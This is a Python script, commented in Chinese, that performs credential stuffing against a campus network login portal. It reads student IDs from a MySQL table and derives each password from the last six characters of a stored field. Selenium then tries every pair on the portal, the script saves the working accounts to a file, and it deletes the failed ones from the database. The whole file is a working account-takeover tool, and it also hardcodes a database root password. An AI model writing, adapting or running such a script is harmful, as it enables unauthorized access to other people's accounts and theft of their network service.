#!/usr/bin/env python
# encoding: utf-8
from selenium import webdriver
import pymysql
import time
import threading


user_list = []
password_list = []

db = pymysql.Connect(host='localhost', port=3306, passwd='1122', db='xiaoyuanwang', user='root', charset='utf8')
cursor = db.cursor()
# sql = "SELECT DISTINCT * FROM `Sheet1` WHERE `学号` > '2019011040';"
select_sql = "SELECT DISTINCT * FROM `Sheet1`"

cursor.execute(select_sql)
for data in cursor.fetchall():
    user_list.append(data[0])
    password_list.append(data[1][-6:])



def save_login(username, passwd):
    with open('校园网可用账号密码.txt', 'a+', encoding='utf-8') as fp:
        fp.write("保存于：{} \t 账号：{} \t 密码：{}  \n".format(TIME, username, passwd))


def save_del(username, passwd):
    with open('已从数据库删除账号密码.txt', 'a+', encoding='utf-8') as fp:
        fp.write("保存于：{} \t 账号：{} \t 密码：{}  \n".format(TIME, username, passwd))

for i in range(len(user_list)):
    localtime = time.localtime()

    TIME = "{}年{}月{}日{}时{}分{}秒".format(localtime[0], localtime[1], localtime[2], localtime[3], localtime[4],
                                       localtime[5])

    user = user_list[i]
    passwd = password_list[i]
    error_text = None

    delete_sql = "DELETE FROM `Sheet1` WHERE `学号` = '{}';".format(user)

    driver = webdriver.Chrome(executable_path=r"/home/zhangyi/chromedriver")
    # driver.maximize_window()
    driver.get('http://192.168.255.100/0.htm')
    try:
        username = driver.find_element_by_id('username')
        password = driver.find_element_by_id('password')
        button = driver.find_element_by_id('submit')
    except:
        print('网页已被拦截正在重新刷新...')
        user_list.append(user)
        password_list.append(passwd)
        continue

    username.click()
    username.clear()
    username.send_keys(user)
    # username.send_keys('2019012251')

    password.click()
    password.clear()
    password.send_keys(passwd)
    # password.send_keys('12234')
    button.click()
    try:
        error_text = driver.find_element_by_xpath('//*[@id="info"]').text
    except:
        pass
    if error_text == '账号或密码不对，请重新输入':
        print('登录失败，user:《{}》passwd:《{}》 账号密码错误'.format(user, passwd))
        cursor.execute(delete_sql)
        db.commit()
        save_del(user, passwd)
        print("已从数据库删除")

    elif error_text == '本账号费用超支或时长流量超过限制':
        print('登录失败，user:《{}》passwd:《{}》 账号密码错误'.format(user, passwd))
        cursor.execute(delete_sql)
        db.commit()
        save_del(user, passwd)
        print("已从数据库删除")
    else:
        print('登录成功，user:《{}》passwd:《{}》'.format(user, passwd))
        save_login(user, passwd)
        # break

cursor.close()
db.close()

print('数据库连接已关闭')
